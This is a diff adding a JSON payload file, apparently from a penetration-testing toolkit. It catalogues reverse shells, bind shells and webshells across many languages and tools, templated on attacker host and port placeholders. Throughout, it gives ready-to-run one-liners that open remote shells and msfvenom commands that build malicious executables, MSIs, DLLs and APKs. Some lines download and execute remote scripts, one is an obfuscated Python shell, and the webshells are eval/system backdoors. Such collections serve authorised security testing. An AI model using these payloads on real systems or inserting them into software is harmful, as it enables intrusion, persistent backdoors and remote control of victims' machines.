@@ -1,0 +1,502 @@
+{
+    "revshells": {
+        "aspx": [
+            {
+                "command": "wget https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/refs/heads/master/shell.aspx -qO - | sed -e 's/String host = \"127.0.0.1\"; \\/\\/CHANGE THIS/String host = \"{LHOST}\";/' -e 's/int port = 1234; \\/\\/\\/\\/CHANGE THIS/int port = {LPORT};/' > /tmp/shell.aspx",
+                "comments":""
+            }
+        ],
+        "awk": [
+            {
+                "command": "awk 'BEGIN {s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
+                "comments":""
+            }
+        ],
+        "bash": [
+            {
+                "command":"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
+                "comments":""
+            },
+            {
+                "command": "bash -c '/bin/bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'",
+                "comments":""
+            },
+            {
+                "command":"/bin/bash -c '/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<&1 2>&1'",
+                "comments":""
+            },
+            {
+                "command":"/bin/bash -i > /dev/tcp/{LHOST}/{LPORT} 0<& 2>&1",
+                "comments":""
+            },
+            {
+                "command":"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done",
+                "comments":""
+            },
+            {
+                "command":"exec /bin/sh 0</dev/tcp/{LHOST}/{LPORT} 1>&0 2>&0",
+                "comments":""
+            },
+            {
+                "command":"0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
+                "comments":""
+            },
+            {
+                "command":"bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",
+                "comments":"UDP revshell"
+            }
+        ],
+        "busybox": [
+            {
+                "command": "busybox nc {LHOST} {LPORT} -e /bin/sh",
+                "comments":""
+            }
+        ],
+        "crystal": [
+            {
+                "command":"crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{LHOST}\",{LPORT});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
+                "comments":"crystal system"
+            },
+            {
+                "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{LHOST}\",{LPORT})\nloop do\n\t m, l = c.receive\n\tp = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n\tc << p.output.gets_to_end\nend",
+                "comments":"crystal code"
+            }
+        ],
+        "golang": [
+            {
+                "command":"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/f.go && go run /tmp/f.go && rm /tmp/f.go",
+                "comments":""
+            }
+        ],
+        "groovy": [
+            {
+                "command": "String host=\"{LHOST}\";\nint port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+                "comments":""
+            }
+        ],
+        "java": [
+            {
+                "command": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
+                "comments":""
+            },
+            {
+                "command":"String host=\"{LHOST}\";\nint port={LPORT};\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
+                "comments":""
+            }
+        ],
+        "lua": [
+            {
+                "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
+                "comments":"Linux"
+            },
+            {
+                "command":"lua5.1 -e 'local host, port = \"{LHOST}\", {LPORT} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
+                "comments":"Windows"
+            }
+        ],
+        "msfvenom": [
+            {
+                "command":"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
+                "comments":"Windows Shell Reverse TCP"
+            },
+            {
+                "command":"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f psh-cmd",
+                "comments":"Base64 Encoded Powershell Reverse TCP"
+            },
+            {
+                "command":"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o shell.exe",
+                "comments":"Windows Meterpreter Reverse TCP"
+            },
+            {
+                "command":"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
+                "comments":"Linux Meterpreter Reverse TCP"
+            },
+            {
+                "command":"msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf",
+                "comments":"Linux Shell Reverse TCP"
+            },
+            {
+                "command":"msfvenom -p osx/x86/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o shell.macho",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp -o shell.asp",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.jsp",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f war -o shell.war",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p php/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p php/reverse_php LHOST={LHOST} LPORT={LPORT} -f raw -o shell.php",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p cmd/unix/reverse_python LHOST={LHOST} LPORT={LPORT} -f raw -o shell.py",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p cmd/unix/reverse_bash LHOST={LHOST} LPORT={LPORT} -f raw -o shell.sh",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p cmd/unix/reverse_perl LHOST={LHOST} LPORT={LPORT} -f raw -o shell.pl",
+                "comments":""
+            },
+            {
+                "command":"msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -R -o shell.apk",
+                "comments":""
+            },
+            {
+                "command":"msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o shell.apk",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe-service -o shell.exe",
+                "comments":"Generate a malicious service"
+            },
+            {
+                "command":"msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o shell.msi",
+                "comments":"Generate a malicious MSI"
+            },
+            {
+                "command":"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f dll -o shell.dll",
+                "comments":"Generate a malicious DLL"
+            },
+            {
+                "command":"msfvenom -p windows/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp -o shell.asp",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f asp -o shell.asp",
+                "comments":""
+            },
+            {
+                "command":"msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b '\\x00\\x0a\\x0d' -e x86/alpha_mixed -f python",
+                "comments":"Python Shellcode"
+            },
+            {
+                "command":"msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b '\\x00\\x0a\\x0d' -e x86/alpha_mixed -f perl",
+                "comments":"Perl Shellcode"
+            }
+        ],
+        "ncat": [
+            {
+                "command":"ncat {LHOST} {LPORT} -e /bin/bash",
+                "comments":""
+            },
+            {
+                "command": "ncat --udp {LHOST} {LPORT} -e /bin/bash",
+                "comments":""
+            }
+        ],
+        "netcat": [
+            {
+                "command": "nc -e /bin/sh {LHOST} {LPORT}",
+                "comments":""
+            },
+            {
+                "command": "nc -e /bin/bash {LHOST} {LPORT}",
+                "comments":""
+            },
+            {
+                "command":"nc.exe -e cmd {LHOST} {LPORT}",
+                "comments":""
+            },
+            {
+                "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} > /tmp/f; rm /tmp/f",
+                "comments":"nc mkfifo"
+            },
+            {
+                "command": "rm /tmp/f; mknod /tmp/f p && nc {LHOST} {LPORT} 0</tmp/f | /bin/bash 1>/tmp/f; rm /tmp/f",
+                "comments":"nc mknod"
+            },
+            {
+                "command": "mknod backpipe p && nc {LHOST} {LPORT} 0<backpipe | /bin/bash 1>backpipe",
+                "comments":""
+            },
+            {
+                "command": "nc -c bash {LHOST} {LPORT}",
+                "comments":""
+            }
+        ],
+        "nodejs": [
+            {
+                "command":"require('child_process').exec('nc -e /bin/sh {LHOST} {LPORT}')",
+                "comments":""
+            },
+            {
+                "command": "var x = global.process.mainModule.require\nx('child_process').exec('nc {LHOST} {LPORT} -e /bin/bash')",
+                "comments":""
+            },
+            {
+                "command": "(function(){\n\tvar net = require(\"net\"),\n\t\tcp = require(\"child_process\"),\n\t\tsh = cp.spawn(\"/bin/sh\", []);\n\tvar client = new net.Socket();\n\tclient.connect({LPORT}, \"{LHOST}\", function(){\n\t\tclient.pipe(sh.stdin);\n\t\tsh.stdout.pipe(client);\n\t\tsh.stderr.pipe(client);\n\t});\n\treturn /a/; // Prevents the Node.js application form crashing\n})();",
+                "comments":""
+            }
+        ],
+        "openssl": [
+            {
+                "command":"rm /tmp/f; mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | openssl s_client -quiet -connect {LHOST}:{LPORT} > /tmp/f; rm /tmp/f",
+                "comments":""
+            }
+        ],
+        "perl": [
+            {
+                "command":"perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+                "comments":""
+            },
+            {
+                "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+                "comments":"Linux"
+            },
+            {
+                "command": "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{LHOST}:{LPORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+                "comments":"Windows"
+            },
+            {
+                "command": "wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz -O /tmp/perl-reverse-shell.tar.gz && tar -C /tmp -xzf /tmp/perl-reverse-shell.tar.gz && sed -e \"s/my \\$ip = '127.0.0.1';/my \\$ip = '{LHOST}';/\" -e \"s/my \\$port = 1234;/my \\$port = {LPORT};/\" /tmp/perl-reverse-shell-1.0/perl-reverse-shell.pl > /tmp/shell.pl && rm -r /tmp/perl-reverse-shell-1.0",
+                "comments":"PentestMonkey Perl Reverse Shell"
+            }
+        ],
+        "php": [
+            {
+                "command":"wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -qO - | sed -e \"s/\\$ip = '127.0.0.1';  \\/\\/ CHANGE THIS/\\$ip = '{LHOST}';/\" -e 's/\\$port = 1234;       \\/\\/ CHANGE THIS/\\$port = {LPORT};/' > /tmp/shell.php",
+                "comments":"PentestMonkey PHP Reverse Shell"
+            },
+            {
+                "command": "wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php -qO - | sed -e \"s/('127.0.0.1', 9000)/('{LHOST}', {LPORT})/g\" > /tmp/shell.php",
+                "comments":"Ivan sincek PHP Reverse Shell"
+            },
+            {
+                "command": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                "comments":""
+            },
+            {
+                "command": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open(\"/bin/sh -i\", array(0=>$s, 1=>$s, 2=>$s),$pipes);'",
+                "comments":""
+            },
+            {
+                "command": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});`/bin/sh -i <&3 >&3 2>&3`;'",
+                "comments":""
+            },
+            {
+                "command": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                "comments":"PHP system"
+            },
+            {
+                "command": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});popen(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                "comments":"PHP popen"
+            },
+            {
+                "command": "php -r '$s=fsockopen(\"{LHOST}\",{LPORT});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                "comments":"PHP passthru"
+            }
+        ],
+        "powershell": [
+            {
+                "command":"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
+                "comments":""
+            },
+            {
+                "command": "IEX(New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1\"); Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port {LPORT}",
+                "comments":"Nishang's Invoke-PowerShellTcp"
+            },
+            {
+                "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {LHOST} {LPORT}",
+                "comments":"ConPty Reverse Shell"
+            },
+            {
+                "command":"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/refs/heads/master/powercat.ps1'); powercat -c {LHOST} -p {LPORT} -e powershell",
+                "comments":"PowerShell powercat"
+            },
+            {
+                "command":"",
+                "comments":"PowerShell Base64"
+            }
+        ],
+        "python": [
+            {
+                "command":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                "comments":""
+            },
+            {
+                "command": "export RHOST=\"{LHOST}\";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
+                "comments":""
+            },
+            {
+                "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
+                "comments":""
+            },
+            {
+                "command": "C:\\Python27\\python.exe -c \"(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{LHOST}', {LPORT})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))\"",
+                "comments":"Windows"
+            }
+        ],
+        "ruby": [
+            {
+                "command":"ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+                "comments":""
+            },
+            {
+                "command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+                "comments":""
+            },
+            {
+                "command": "ruby -rsocket -e 'c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+                "comments":"Windows"
+            }
+        ],
+        "socat": [
+            {
+                "command":"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}",
+                "comments":""
+            },
+            {
+                "command": "socat tcp-connect:{LHOST}:{LPORT} exec:\"bash -li\",pty,stderr,setsid,sigint,sane",
+                "comments":""
+            },
+            {
+                "command": "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}",
+                "comments":""
+            }
+        ],
+        "tclsh": [
+            {
+                "command":"echo 'set s [socket {LHOST} {LPORT}];while 42 { puts -nonewline $s \"shell>\";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh",
+                "comments":""
+            }
+        ],
+        "telnet": [
+            {
+                "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {LHOST} {LPORT} > /tmp/f; rm /tmp/f",
+                "comments":"telnet mkfifo"
+            },
+            {
+                "command": "rm -f /tmp/f; mknod /tmp/f p && telnet {LHOST} {LPORT} 0</tmp/f | /bin/bash 1>/tmp/f; rm /tmp/f",
+                "comments":"telnet mknod"
+            },
+            {
+                "command":"rm /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0/tmp/p 2>&1; rm /tmp/p",
+                "comments":""
+            },
+            {
+                "command": "telnet {LHOST} {LPORT} | /bin/bash | telnet {LHOST} 667",
+                "comments":""
+            }
+        ]
+    },
+    "bindshells": {
+        "netcat": [
+            {
+                "command": "nc -nlvp {LPORT} -e /bin/sh",
+                "comments":""
+            },
+            {
+                "command":"nc.exe -nlvp {LPORT} -e cmd",
+                "comments":""
+            },
+            {
+                "command":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp {LPORT} >/tmp/f; rm /tmp/f",
+                "comments":"nc mkfifo"
+            }
+        ],
+        "ncat": [
+            {
+                "command": "ncat -nlvp {LPORT} -e /bin/bash",
+                "comments":""
+            }
+        ],
+        "perl": [
+            {
+                "command": "perl -e 'use Socket;$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
+                "comments":""
+            }
+        ],
+        "powershell": [
+            {
+                "command":"powercat -l -p {LPORT} -e cmd",
+                "comments":"PowerShell powercat"
+            }
+        ],
+        "python": [
+            {
+                "command":"python -c \"exec('import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{LPORT}));s1.listen(1);c,a=s1.accept();while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())')\"",
+                "comments":""
+            }
+        ],
+        "ruby": [
+            {
+                "command":"ruby -rsocket -e 'f=TCPServer.new({LPORT}); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec \"/bin/sh -i\"'",
+                "comments":""
+            }
+        ],
+        "socat": [
+            {
+                "command": "socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
+                "comments":""
+            },
+            {
+                "command": "wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
+                "comments":""
+            }
+        ]
+    },
+    "webshells": {
+        "asp": [
+            {
+                "command": "wget https://raw.githubusercontent.com/jbarcia/Web-Shells/refs/heads/master/laudanum/asp/shell.asp -O /tmp/cmd.asp",
+                "comments":""
+            },
+            {
+                "command": "echo '<% eval request(\"cmd\") %>' > /tmp/cmd.asp",
+                "comments":""
+            }
+        ],
+        "aspx": [
+            {
+                "command": "wget https://raw.githubusercontent.com/jbarcia/Web-Shells/refs/heads/master/laudanum/aspx/shell.aspx -O /tmp/cmd.aspx",
+                "comments":""
+            }
+        ],
+        "jsp": [
+            {
+                "command":"echo '<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>' > /tmp/cmd.jsp",
+                "comments":""
+            }
+        ],
+        "php": [
+            {
+                "command":"echo '<?php system($_REQUEST[\"cmd\"]); ?>' > /tmp/cmd.php",
+                "comments":"PHP system"
+            },
+            {
+                "command": "echo '<?php passthru($_REQUEST[\"cmd\"]); ?>' > /tmp/cmd.php",
+                "comments":"PHP passthru"
+            },
+            {
+                "command":"weevely generate ExegolFTW /tmp/weevely.php",
+                "comments":"Weevely"
+            },
+            {
+                "command": "wget https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php -O /tmp/p0wny-shell.php",
+                "comments":"P0wny shell"
+            },
+            {
+                "command": "wget https://raw.githubusercontent.com/Arrexel/phpbash/refs/heads/master/phpbash.php -O /tmp/phpbash.php",
+                "comments":"Phpbash"
+            },
+            {
+                "command": "<html><body><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset($_GET['cmd'])){ system($_GET['cmd'] . ' 2>&1');}?></pre></body></html>",
+                "comments":""
+            }
+        ]
+    }
+}
